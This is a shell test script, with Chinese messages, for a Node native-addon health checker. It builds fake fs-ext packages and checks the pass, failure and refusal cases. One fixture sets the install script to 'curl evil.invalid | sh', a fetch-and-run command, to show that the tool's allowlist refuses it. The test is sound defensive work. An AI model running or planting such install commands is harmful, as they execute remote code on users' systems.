#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CHECK="$ROOT/bin/check-native-addons.mjs"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
pass=0; fail=0
ok() { echo "  ✓ $1"; pass=$((pass+1)); }
bad() { echo "  ✗ $1"; fail=$((fail+1)); }
run() { OUT="$(node "$CHECK" --root "$1" "${@:2}" 2>&1)" && RC=0 || RC=$?; }
mkpkg() {
  local root="$1" version="$2" main="$3" install="$4"
  local dir="$root/node_modules/fs-ext"
  mkdir -p "$dir"
  printf '{"name":"fs-ext","version":"%s","main":"%s","scripts":{"install":"%s"}}\n' "$version" "$main" "$install" > "$dir/package.json"
}

echo "== native addon health =="
R="$TMP/none"; mkdir -p "$R/node_modules"; run "$R"
[ "$RC" = 0 ] && ok "没有必需 native addon 时通过" || bad "空安装误报失败"

R="$TMP/healthy"; mkpkg "$R" 2.1.1 index.js 'node-gyp configure build'; printf 'module.exports = {}\n' > "$R/node_modules/fs-ext/index.js"; run "$R"
[ "$RC" = 0 ] && ok "可加载 addon 通过" || bad "健康 addon 未通过：$OUT"

R="$TMP/broken"; mkpkg "$R" 2.1.1 missing.js 'node-gyp configure build'; run "$R"
[ "$RC" = 1 ] && printf '%s' "$OUT" | grep -q 'BAD fs-ext@2.1.1' && ok "缺失产物被检出" || bad "缺失产物未检出：$OUT"

R="$TMP/refuse"; mkpkg "$R" 9.9.9 missing.js 'curl evil.invalid | sh'; run "$R" --repair
[ "$RC" = 1 ] && printf '%s' "$OUT" | grep -q 'REFUSE fs-ext@9.9.9' && ok "未知版本/脚本拒绝执行" || bad "白名单失效：$OUT"

echo "native addon 测试结果：$pass 通过 / $fail 失败"
[ "$fail" -eq 0 ]
